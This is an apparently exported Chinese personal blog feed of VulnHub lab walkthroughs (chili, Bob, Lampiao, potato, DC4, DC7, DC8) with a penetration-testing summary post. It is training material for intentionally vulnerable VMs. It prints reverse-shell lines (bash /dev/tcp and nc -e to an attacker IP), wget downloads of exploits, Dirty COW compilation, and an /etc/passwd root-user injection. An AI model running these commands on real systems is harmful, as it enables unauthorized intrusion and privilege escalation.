        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>扫描目标靶机端口，发现只开了80和21端口，21端口开的还是ftp服务。<br><img src="/2020/11/30/vulnhub-chili/1.png" alt></p><h2 id="前渗透阶段"><a href="#前渗透阶段" class="headerlink" title="前渗透阶段"></a>前渗透阶段</h2><p>访问80端口，除了一个辣椒页面啥也没有，<br><img src="/2020/11/30/vulnhub-chili/2.png" alt><br>于是只能访问21端口看看ftp是不是可以匿名访问的，可惜不能，账号和密码，我们此时都不知道，我们在下载靶机的时候，作者给了我们一些提示，让我们试试靶场名字也就是chili，没有密码只能爆破，跑九头蛇，找到了密码，a1b2c3d4</p><pre class=" language-shell"><code class="language-shell">ftp -nv 192.168.10.74    //linux ftp连接命令put 12138.php /var/www/html/.nano/12138.php    //将你本机现在所在路径中的12138.PHP文件上传到目标机器/var/www/html/.nano路径下</code></pre><p><img src="/2020/11/30/vulnhub-chili/3.png" alt><br><img src="/2020/11/30/vulnhub-chili/4.png" alt><br>登录上ftp之后随便翻翻也没有什么，想着从系统版本漏洞入手，uname-a一看比我的kali版本都新，告辞。再用sudo命令，发现被禁用了，再换个命令查看权限，发现也没有什么特殊的权限，心态炸裂，只能到处ls -la看看有没有什么隐藏的文件说不定我们就会有较高的权限，<br><img src="/2020/11/30/vulnhub-chili/5.png" alt><br>果然，我们在/var/www/htnl中发现了隐藏文件，而且我们还有很高的权限，和root一样，那么就可以向里边上传PHP版本的反弹shell脚本，浏览器访问之后，就拿到了www-data用户的shell。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"bash -c 'bash -i>&amp; /dev/tcp/192.168.10.207/7744 0>&amp;1' "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//版本的PHP反弹shell</span></code></pre><p><img src="/2020/11/30/vulnhub-chili/6.png" alt><br><img src="/2020/11/30/vulnhub-chili/7.png" alt></p><h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h2><p>之前我们在.nano文件中具有和root一样的权限，那么我们完全可以在此文件中利用我们的权限向/etc/passwd中写入一个root组的用户，然后转换用户就提权了，没想到吧，这个靶场提权就是这么简单。<br><img src="/2020/11/30/vulnhub-chili/8.png" alt><br><img src="/2020/11/30/vulnhub-chili/9.png" alt></p>]]></content>
      
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些知识的积累</title>
      <link href="/2020/11/27/%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%9A%84%E7%A7%AF%E7%B4%AF/"/>
      <url>/2020/11/27/%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%9A%84%E7%A7%AF%E7%B4%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="关于博客"><a href="#关于博客" class="headerlink" title="关于博客"></a>关于博客</h2><p>我今天被博客cdn加速给疯狂军训，到最后我才发现，是我的博客用的cdn自身有问题，先在这里介绍一下我用的cdn：jsdelivr，是一个对部署在github上的博客有加速功能的cdn，但是，这个cdn你如果让他加速图片的话，例如：你的博客背景图片是在一个文件夹里，首先这个文件夹大小不能超过50MB，其次，你如果把你的波尔克背景图片删除一些，这个cdn网站不会把该删除的删除，就好比你的博客背景图片原本有名字为1-7的七张图片，后来你把第7张图片删除了，但是这个cdn上还会缓存有第七张图片，而且你还没办法删除，还占空间。（就是这个问题疯狂军训我）</p><p>一个hexo博客的插件：hexo-admin，便于书写和修改文章，此插件感觉只是部署到自己本地最好，毕竟是有风险的，</p><pre class=" language-shell"><code class="language-shell"> npm install --save hexo-admin    //安装相关插件</code></pre><p>然后在git上hexo s将你的博客部署到本地，在打开localhost:4000/admin就可以看到这个插件的页面。其中deplay页面相当于一个上传页面，也就相当于我们之前上传博客时用到的hexo g -d 但是使用之前需要我们配置一下博客的根文件（_config.yml），向其中加上</p><pre class=" language-shell"><code class="language-shell">admin:  deployCommand: 'hexo-publish.bat'</code></pre><p>然后再在我们的博客文件中创建hexo-publish.bat文件，文件内容为：</p><pre class=" language-shell"><code class="language-shell">hexo clean && hexo g -d</code></pre><p>到此文件就配置完毕，但注意我们每次需要用到这个插件都要hexo s一下把博客先部署到本地。</p><h2 id="关于渗透"><a href="#关于渗透" class="headerlink" title="关于渗透"></a>关于渗透</h2><p>最近做了不少的vulnhub靶场例如DC1-9，bob，potato，Lampiao，还有刚做的m87，这些都是基本的靶场了，做了这么多，我也该总结一下了。</p><h3 id="关于信息渗透阶段"><a href="#关于信息渗透阶段" class="headerlink" title="关于信息渗透阶段"></a>关于信息渗透阶段</h3><p>一般来说，我们再打靶之前会先对靶机扫一下IP，然后扫一下端口，那这里我就分享一下几个nmap的命令：</p><pre><code>nmap   192.168.10.1/24     //扫描该网段的所有主机nmap   192.168.10.211      //扫描211的端口，这相当于一个初步探测nmap -sS -A 192.168.171.0/24   //对一个网段进行进一步的扫描</code></pre><p>我们得到靶机的IP和端口之后，基本上会看一下对应的端口都开了些什么服务，例如22端口的ssh服务，80的web服务，还有靶机其他端口开起的服务也会成为我们的渗透点，例如我刚做的m87靶场后渗透阶段的中心就在9090端口开启的web服务上。</p><h3 id="前渗透阶段"><a href="#前渗透阶段" class="headerlink" title="前渗透阶段"></a>前渗透阶段</h3><p>在弄清了靶机开启的服务之后，我们一般都会从靶机的80端口入手，在开始的阶段我们基本上都会先去80端口看看有没有什么可以利用的东西，如果翻了翻还是没有就扫描一下网站的目录，在这里分享一个命令：</p><pre class=" language-shell"><code class="language-shell">dirb http://192.168.10.211     //扫描该网站的80端口下的目录</code></pre><p>我们在扫描过之后一般都会发现一些有用的界面，例如robots.txt，一些能够执行命令的界面，能够SQL注入的页面，能够文件包含的页面等等。然后利用这些或者反弹shell，或者SQL注入爆库，或者文件包含上传一句话木马等手段拿到一个权限较低的用户权限，这个过程比较考验我们的细心观察能力，同时也基本上是最难的一步。同样，这一步对于我们对工具的掌握能力有较高的要求，就像我打m87靶场的时候还得人工爆破，sqlmap还不会用（我是菜鸡）。</p><h3 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h3><p>我们在到了后渗透阶段的时候基本上就有着一个或大或小权限的用户，我们接下来考虑的就是怎么提升权限到root，一般来说我们会首先sudo -l一下看看当前用户的权限，看一下有没有能提权的点，如果有就会想办法去利用，没有的话可以从系统的角度下手，uname -a看看系统版本再到kali中找找看有没有对应的exp，其中最著名的莫过于脏牛提权了。如果以上两者都没有提权的点，那我们只能尝试从其他地方找找看有没有其他用户有关密码的提示，在得到其他用户权限后接着上一步走，有时候我们需要不止一次转换用户，甚至我们最初得到的用户权限连cd权限都有可能没有，这时候就需要我们利用自当前用户对于某个文件具有写的权限写一下!/bin/bash,来让自己的命令得到“释放”。不过，最基本的还是我们在得到在某些文件中具有root权限的用户时怎么去利用，就像DC-9中的我们得到了一个用户权限，此用户在一个python文件中具有root权限，具体为：向文件B中写入文件A，那么我们就可以伪造一个在/etc/passwd文件下和root用户一样格式的用户，写入到/etc/passwd中，然后切换用户完成提权。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总而言之我们遇到的多了，渐渐地就会懂得多了，不会再向刚学安全时候那样感觉无力了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-Bob</title>
      <link href="/2020/11/27/vulnhub-Bob/"/>
      <url>/2020/11/27/vulnhub-Bob/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="/2020/11/27/vulnhub-Bob/1.png" alt><br>靶机开放了80和21端口（我全程下来都没有利用过这个端口），打开80界面发现就一张图片，其余什么也没有，<br><img src="/2020/11/27/vulnhub-Bob/2.png" alt><br>所以就dirb一下网站的文件目录<br><img src="/2020/11/27/vulnhub-Bob/3.png" alt><br>发现了敏感文件robots.txt，访问发现是四个页面，逐一访问在/dev_shell.php页面发现了一些有用的东西<br><img src="/2020/11/27/vulnhub-Bob/4.png" alt></p><h2 id="前渗透阶段"><a href="#前渗透阶段" class="headerlink" title="前渗透阶段"></a>前渗透阶段</h2><p>我们发现/dev_shell.php是一个命令执行的页面，所以这就就是我们拿到shell的一个点，在这里我利用了普通的反弹shell，发现并没有什么用，所以就去看了别人的wp，发现这里对我们输入语句做了比较严格的限制，找了半天找到了一个能用到的反弹shell语句</p><pre class=" language-shell"><code class="language-shell">/bin/nc -e /bin/sh 192.168.10.207 7744    //反弹shell语句</code></pre><p>kali监听端口之后就到了我们接下来的提权阶段<br><img src="/2020/11/27/vulnhub-Bob/5.png" alt><br><img src="/2020/11/27/vulnhub-Bob/6.png" alt></p><h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h2><p>我们暂时的用户为www-data，su一下发现并没有什么可提权的点，系统版本也找不到相关的漏洞，直接去根目录下看看发现了flag.txt文件，但是我们没有权限（很肏），所以就去别的用户目录下看看有没有什么可以利用的信息，这里我们可以联想一下最初的时候web页面的介绍，提示我们注意Documents，所以就看一下每个用户的Documents目录，在bob用户的Documents目录看到了一些我们感兴趣的东西。<br><img src="/2020/11/27/vulnhub-Bob/7.png" alt><br>这里的login.txt.gpg文件我在开始做的时候觉得很奇怪，在我双看了别人的wp之后发现此文件是一个被加密过的文件，但是我们没有密码，翻了一下staff.txt文件，看了看之后发没觉得有什么发现，然后使劲翻Secret文件终于发现了一个有用的东西<br><img src="/2020/11/27/vulnhub-Bob/8.png" alt><br>起先我没看懂这是什么，所以就叒看了别人的wp，发现这是一个藏头诗，将头部聚集起来就是harpocrates的大写，也就是我们之前看到的被加密过的文件的密码，本来我挺高兴的去解密结果发现自己不会解密命令，所以就叕去看了别人的wp，解密命令如下</p><pre class=" language-shell"><code class="language-shell">gpg --batch --passphrase HARPOCRATES -d login.txt.gpg</code></pre><p>但是我们没有权限（很肏），<br><img src="/2020/11/27/vulnhub-Bob/12.png" alt><br>于是就只能到其他用户目录下看看有没有能用的信息，然后我们在elliot目录下发现了一个文档<br><img src="/2020/11/27/vulnhub-Bob/9.png" alt><br>发现了james的密码，su一下（james的用户名叫jc），只时候我们再到bob的Documents目录下看看能不能解密刚才那个文件，发现成功<br><img src="/2020/11/27/vulnhub-Bob/10.png" alt><br>发现了bob用户的密码，直接su一手，只时候我想到了那个在根目录下的flag.txt文件，看一看这次有没有权限打开，最后成功拿到flag（我也不知道为什么要用sudo命令）<br><img src="/2020/11/27/vulnhub-Bob/11.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-Lampiao</title>
      <link href="/2020/11/25/vulnhub-Lampiao/"/>
      <url>/2020/11/25/vulnhub-Lampiao/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>扫描靶机IP，以及靶机的端口，此靶场的开放端口会有点特殊，只看到了22端口和8端口，打开80端口，发现什么也没有，<br><img src="/2020/11/25/vulnhub-Lampiao/1.png" alt><br>觉得应该像之前的做过的靶场一样有端口我们没有扫描出来，所以我用nmap再次扫描发现了一个不一样的端口<br><img src="/2020/11/25/vulnhub-Lampiao/2.png" alt><br>打开1898界面，发现是个博客，利用dirb扫描一下博客，<br><img src="/2020/11/25/vulnhub-Lampiao/3.png" alt><br>发现了robots.txt这个敏感文件，访问一下，看看有没有什么能用信息，同时也看一下网站的具体信息，<br><img src="/2020/11/25/vulnhub-Lampiao/4.png" alt></p><h2 id="前渗透阶段"><a href="#前渗透阶段" class="headerlink" title="前渗透阶段"></a>前渗透阶段</h2><p>发现是drapul7版本的博客，我们在web页面没有什么能够利用的渗透点，索性就从系统入手，在klai中找一下能够利用的exp<br><img src="/2020/11/25/vulnhub-Lampiao/5.png" alt><br>我们利用18年这个攻击模块，（由于7版本是比较新的博客版本，之前的漏洞可能已经打好了补丁），设置好RHOST和RPORT，然后exploit，拿到shell，然后利用python实现交互式shell。<br><img src="/2020/11/25/vulnhub-Lampiao/6.png" alt></p><h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h2><p>既然我们已经拿到了www-data用户的权限，那么我们接下来就是想着怎么去提权，利用uname -a的命令查看系统版本，<br><img src="/2020/11/25/vulnhub-Lampiao/7.png" alt><br>发现此版本为Ubuntu在16年8月的版本，所以我们难免会想到一个著名的Linux“老年”漏洞：脏牛。既然我们知道怎样去提权了，那么接下来就好办了，（再打这个靶场之前，我连脏牛是啥都不知道，草率了），所以我去看了别人的脏牛提权教程，发现此靶场利用的是40847.cpp，我们search一波就发现了<br><img src="/2020/11/25/vulnhub-Lampiao/8.png" alt><br>所以将exp上传到靶机上，我们先在kali上开启临时web服务，上传exp</p><pre class=" language-shell"><code class="language-shell">python -m SimpleHTTPServer   //kali开启临时web服务</code></pre><p><img src="/2020/11/25/vulnhub-Lampiao/9.png" alt><br><img src="/2020/11/25/vulnhub-Lampiao/10.png" alt></p><pre class=" language-shell"><code class="language-shell">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil                       //exp编译语句</code></pre><p>将exp上传到靶机上之后，由于是cpp文件比较特殊，编译的语句确实很长（我实在看不同编译的shell命令，还是太菜了），成功将exp编译为可执行的文件，然后执行文件，最后得到root权限，拿到了flag。<br><img src="/2020/11/25/vulnhub-Lampiao/11.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-potato(SunCSR)</title>
      <link href="/2020/11/21/vulnhub-potato-SunCSR/"/>
      <url>/2020/11/21/vulnhub-potato-SunCSR/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>扫描一波，找到靶机的IP，<br><img src="/2020/11/21/vulnhub-potato-SunCSR/1.png" alt><br>直接IP打开80端口页面，发现除了一张土豆照片之外什么也没有，所以觉得可能会有其他端口开启了但没有被扫描到，所以，利用nmap再扫描一次，看到了开起了7120端口，而且利用了TCP协议，我在看了别人的wp之后了解到靶机将ssh服务转接到了7120端口。<br><img src="/2020/11/21/vulnhub-potato-SunCSR/2.png" alt></p><h2 id="前渗透阶段"><a href="#前渗透阶段" class="headerlink" title="前渗透阶段"></a>前渗透阶段</h2><p>所以我尝试连接一下发现了确实是一个ssh端口，但是我没有登录的账号密码，所以只能利用被人的wp，得到账号为potato，密码为letmein（主要是我的九头蛇出问题了，还有就是没有字典），登录上之后，我们相当于一个游客的权限。<br><img src="/2020/11/21/vulnhub-potato-SunCSR/3.png" alt></p><h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h2><p>在登陆上之候，sudo一下发现并没有文件我们是可以以root权限执行的，所以就只能从系统漏洞着手了，发现这是一个版本为3.13.0的Ubuntu。（很老的版本了）<br><img src="/2020/11/21/vulnhub-potato-SunCSR/7.png" alt><br>在kali中寻找一下该系统的exp，将37292.c保存到/var/www/html目录下，<br><img src="/2020/11/21/vulnhub-potato-SunCSR/4.png" alt><br>然后开启web服务。</p><pre class=" language-shell"><code class="language-shell">python -m SimpleHTTPServer  //kali开启web服务wget http://192.168.10.207:8000/wdnmd.c  //靶机下载exp</code></pre><p><img src="/2020/11/21/vulnhub-potato-SunCSR/5.png" alt><br>靶机从kali上下载exp，将39272利用gcc命令转变一下文件格式，从c文件转换为文件，（我背这一步卡了好长时间，最后看了c文件中给的提示才知道怎么操作）然后执行，拿到了root权限，拿到了flag。</p><pre class=" language-shell"><code class="language-shell">gcc wdnmd.c -o wdnmd    /文件格式转换./wdnmd            /执行文件，提权</code></pre><p><img src="/2020/11/21/vulnhub-potato-SunCSR/6.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-DC8</title>
      <link href="/2020/11/17/vulnhub-DC8/"/>
      <url>/2020/11/17/vulnhub-DC8/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>老规矩，扫描一波IP地址，发现靶机的IP和开放端口，靶机开放了80和22端口，推测我们又要从80端口开始渗透<br><img src="/2020/11/17/vulnhub-DC8/1.png" alt></p><h2 id="前渗透阶段"><a href="#前渗透阶段" class="headerlink" title="前渗透阶段"></a>前渗透阶段</h2><p>进入靶机的80页面之后发现是一个博客页面，随便点点，发现URL会发生变化，<br><img src="/2020/11/17/vulnhub-DC8/2.png" alt><br>看着挺像做SQL注入时的靶场，所以，测试一下SQL注入，<br><img src="/2020/11/17/vulnhub-DC8/3.png" alt><br>我在这里猜测一下这个SQL漏洞的原理，对于URL中GET到的数据没有做出防护而且默认给我们会自动加上’进行闭合，而我们如果输入语句进行闭合那么之后的语句不会被执行。而且这里只有三个字段名，所以我们在nid后的数字只要不填123就可以注入<br><img src="/2020/11/17/vulnhub-DC8/4.png" alt><br><img src="/2020/11/17/vulnhub-DC8/5.png" alt><br><img src="/2020/11/17/vulnhub-DC8/6.png" alt><br><img src="/2020/11/17/vulnhub-DC8/7.png" alt><br>所以利用SQL注入拿数据库名，表名，字段名，用户名和密码</p><p>然后启用kali中的john开始对得到的密码进行暴力破解，最后可以得到john的密码（admin的密码就别想了），<br><img src="/2020/11/17/vulnhub-DC8/8.png" alt><br>得到john的密码为turtle，本来我想用ssh连接但最后失败了，所以就只能把注意力转到80页面，登录一波，（登录页面可以通过查看rebots.txt来查看），登录john的账号，<br>看看有没有什么值得注意的地方，最后发现，这个博客支持PHP语言，<br><img src="/2020/11/17/vulnhub-DC8/9.png" alt></p><h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h2><p>所以对页面进行写入反弹shell的PHP代码（原本试了一句话木发现不行），kali监听端口，然后利用pyhton实现交互式shell，<br><img src="/2020/11/17/vulnhub-DC8/10.png" alt><br>再查看当前用户的权限，最后发现，在/usr/bin/exim4当前用户具有较高的权限，<br><img src="/2020/11/17/vulnhub-DC8/11.png" alt><br>在kali中searchsploits一下发现了，不少漏洞，我看了别人的wp之后，发现46996是用的最频繁的（主要是它自身就是一个脚本），<br><img src="/2020/11/17/vulnhub-DC8/12.png" alt><br>把46996转换成unix支持的文件格式要不然执行的时候会报错（我被这一步卡了好久，心态炸裂），<br><img src="/2020/11/17/vulnhub-DC8/13.png" alt><br>然后在kali上开启web服务，将脚本下载到靶机上（最好是/tmp下，我在其他目录下发现www-data用户没有权限），</p><pre class=" language-shell"><code class="language-shell">python -m SimpleHTTPServer     //kali开启http服务的命令wget http://1921.168.1.210/12138.sh   //从kali中下载脚本</code></pre><p><img src="/2020/11/17/vulnhub-DC8/14.png" alt><br><img src="/2020/11/17/vulnhub-DC8/15.png" alt><br><img src="/2020/11/17/vulnhub-DC8/16.png" alt><br>给脚本权限之后运行，就可以拿到root权限，最后拿到flag，</p>]]></content>
      
      
      <categories>
          
          <category> web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-DC7</title>
      <link href="/2020/11/14/vulnhub-DC7/"/>
      <url>/2020/11/14/vulnhub-DC7/</url>
      
        <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>在配置好vulnhub-DC7之后我们在他的虚拟机界面能够直接看到他的IP地址，然后根据我们之前的套路，直接用IP地址访问，可你看到80界面。同时也顺便扫一下靶机的端口，可以看到，开启了22端口，说明我们会拿到某些用户的账号和密码。</p><p><a href="https://imgchr.com/i/DPMnIS" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPMnIS.png" alt></a><br>我根据网上看到wp，发现关键在于@DC7USER，也就是我们在靶机80页面的页脚，百度搜一手，发现是个github用户。<br><a href="https://imgchr.com/i/DPMQ2j" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPMQ2j.png" alt></a><br><a href="https://imgchr.com/i/DPMtaT" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPMtaT.png" alt></a></p><h1 id="前渗透阶段"><a href="#前渗透阶段" class="headerlink" title="前渗透阶段"></a>前渗透阶段</h1><p>用户的公共仓库中有网站的部分源码，下载后在config.php中发现了用户名和密码，利用ssh连接一手。<br><a href="https://imgchr.com/i/DPMNIU" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPMNIU.png" alt></a><br><a href="https://imgchr.com/i/DPMaiF" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPMaiF.png" alt></a><br>cat一下该用户目录下的两个文件，发现有一个打不开，另外一个是一个邮件，而且，我们在这个邮件的前半部分发现了一个路径，<br><a href="https://imgchr.com/i/DPMwRJ" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPMwRJ.png" alt></a><br>cd一手发现没有什么提示，<br><a href="https://imgchr.com/i/DPMxQs" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPMxQs.png" alt></a><br>再查看一下该文件的权限，发现一个奇怪的东西，这个文件root具有最高权限，但是它所属的是www-data组，也就是说这可能会是我们的一个提权的点。</p><p>那么接下来就需要我们想办法去将自己变为www-data，然而到这里我是真的感觉抓瞎，在看了别人的wp之后发现drush是drupal站点专门用来管理自己网站的shell，也就是说我们可以在网站的根目录下修改网站用户的密码，然后cd到网站根目录下操作<br><a href="https://imgchr.com/i/DPQCwV" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPQCwV.png" alt></a><br>我们在修改过admin的密码之后从靶机的80页面登录，然后进入后台。<br><a href="https://imgchr.com/i/DPQeyR" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPQeyR.png" alt></a><br>这时候我感觉又抓瞎了，然后就双快乐一下别人的wp，发现这个网站本身是不支持PHP语言的，但是drupal有支持PHP的插件，所以我们可以到下面的地址中下载压缩包<br><a href="https://www.drupal.org/project/php" target="_blank" rel="noopener">https://www.drupal.org/project/php</a></p><p>在下载完成之后去靶机80页面的后台进行如下操作<br><a href="https://imgchr.com/i/DPQtOI" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPQtOI.png" alt></a><br><a href="https://imgchr.com/i/DPQa0P" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPQa0P.png" alt></a><br><a href="https://imgchr.com/i/DPQBtS" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPQBtS.png" alt></a><br><a href="https://imgchr.com/i/DPQDfg" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPQDfg.png" alt></a><br><a href="https://imgchr.com/i/DPQspQ" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPQspQ.png" alt></a><br>然后install</p><h1 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h1><p>然后我们就可以使用PHP语言类，然后进入网站后台，编辑一下主页面，加入一句话木马<br><a href="https://imgchr.com/i/DPQvtO" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPQvtO.png" alt></a><br>蚁剑连接，反弹shell，实现交互式shell</p><p><a href="https://imgchr.com/i/DPllBq" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPllBq.png" alt></a><br><a href="https://imgchr.com/i/DPltCF" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPltCF.png" alt></a></p><p>刚才我们发现了/opt/scripts/backups.sh这个文件是一个提权的点，所以我叒看了别人的wp，发现这确实是一个提权的点，原理是，这是原本是一个备份文件，而root用户每隔一段时间就会指向这个文件里边的命令，所以我们一www-data用户向这个文件中写入反弹shell的命令，kali中监听端口，而我们只要等待root用户下一次执行这个文件就可以拿到root用户的权限了。<br><a href="https://imgchr.com/i/DPlhDI" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPlhDI.png" alt></a><br><a href="https://imgchr.com/i/DPl4bt" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPl4bt.png" alt></a></p>]]></content>
      
      
      <categories>
          
          <category> web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-DC4</title>
      <link href="/2020/11/12/vulnhub-DC4/"/>
      <url>/2020/11/12/vulnhub-DC4/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>配好vulnhub-DC4的靶场之后，开始扫描同网段存活主机，发现靶机开起来80和22端口，猜测我们接下来可能会用到爆破拿到相关的用户名和密码。</p><p><img src="/2020/11/12/vulnhub-DC4/1.png" alt></p><h1 id="前渗透阶段"><a href="#前渗透阶段" class="headerlink" title="前渗透阶段"></a>前渗透阶段</h1><p>然后访问靶机的80页面，发现是个登录框，一开始我认为是存在SQL注入漏洞，后来在看了别热的wp之后发现是利用爆破得到登录的账号和密码（账号一般都为admin），所以，利用burp的爆破板块开始爆破，后来发现用到的字典是在太大，爆破的时间太长，所以只好看了别人的wp，得到admin的密码为happy。</p><p>然后我们通过admin进入页面，发现是一个类似远程命令执行的页面，</p><p><img src="/2020/11/12/vulnhub-DC4/2.png" alt></p><p><img src="/2020/11/12/vulnhub-DC4/3.png" alt></p><p>验证一波能否执行远程命令</p><p><img src="/2020/11/12/vulnhub-DC4/4.png" alt></p><p>二话不说，直接抓包改数据反弹shell。</p><p><img src="/2020/11/12/vulnhub-DC4/5.png" alt></p><p>kali中监听端口，然后开启交互式shell。</p><p><img src="/2020/11/12/vulnhub-DC4/6.png" alt></p><h1 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h1><p>我根据别人缩写wp看到了在/home/jim/backups的文件夹中有一个old-passwords的文件，cat一下，发现了一些有用的东西</p><p><img src="/2020/11/12/vulnhub-DC4/7.png" alt></p><p>将文件中的密码copy一下，然后利用九头蛇以jim用户的身份（因为这是在jim用户的文件夹下，多半是jim用户的密码文件）连接靶机的ssh端口，最后成功爆破出来，密码为jibril04。</p><p><img src="/2020/11/12/vulnhub-DC4/8.png" alt></p><p>通过ssh登录，接下来就是进一步的提权了</p><p><img src="/2020/11/12/vulnhub-DC4/9.png" alt></p><p>我们在ls一下后发现有一个mbox的文件，cat一下，发现这类似一个邮件，</p><p><img src="/2020/11/12/vulnhub-DC4/10.png" alt></p><p>于是我们到/var/mail这个默认邮件地址查看一手，发现有一个jim的邮件</p><p><img src="/2020/11/12/vulnhub-DC4/11.png" alt></p><p>cat一下发现了charles的密码为^xHhA&amp;hvim0y</p><p><img src="/2020/11/12/vulnhub-DC4/12.png" alt></p><p>直接用charles的账号通过ssh连接靶机</p><p><img src="/2020/11/12/vulnhub-DC4/13.png" alt></p><p>然后利用产看此用户的权限，可以看到我们在teehee中是不需要root用户的密码就可以执行root的权限，所以这就是一个提权的点，</p><p><img src="/2020/11/12/vulnhub-DC4/14.png" alt></p><p>然后构造提权的语句</p><pre class=" language-shell"><code class="language-shell">echo "fake::0:0:::/bin/bash" | sudo teehee -a /etc/passwd        //利用我们在teehee中的权限向/etc/passwd中加入一个具有root权限的名为fake的用户</code></pre><p><img src="/2020/11/12/vulnhub-DC4/15.png" alt></p><p>然后切换用户成功提权，拿到flag</p><p><img src="/2020/11/12/vulnhub-DC4/16.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulbhub-DC5</title>
      <link href="/2020/11/11/vulbhub-DC5/"/>
      <url>/2020/11/11/vulbhub-DC5/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="阶段一：信息收集"><a href="#阶段一：信息收集" class="headerlink" title="阶段一：信息收集"></a>阶段一：信息收集</h1><p>我们在配置好靶场文件之后运行靶场，利用namp发现靶机开启了80和111端口，</p><p><a href="https://imgchr.com/i/BvA8Jg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvA8Jg.png" alt></a></p><p>111端口的用处如下：</p><p>111端口是baiSUN公司的RPC服务du所有端口，常见RPC服务有rpc.mountd、NFS、rpc.statd、rpc.csmd、rpc.ttybd、amd。（摘自百度知道，虽然我也不知道这些服务是干啥的），总而言之，我们对这个靶场的渗透还是从80端口开始的，通过IP访问，可以访问到以下界面</p><p><a href="https://imgchr.com/i/BvADFU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvADFU.png" alt></a></p><p>在看过每个页面之后，我门可以发现我们在contact处在点击提交之后，会发现相仿Copyright的标志会发生变化，在看过别人的wp之后知道这里存在一个文件包含，所以直接测试一波，</p><p><a href="https://imgchr.com/i/BvAcl9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvAcl9.png" 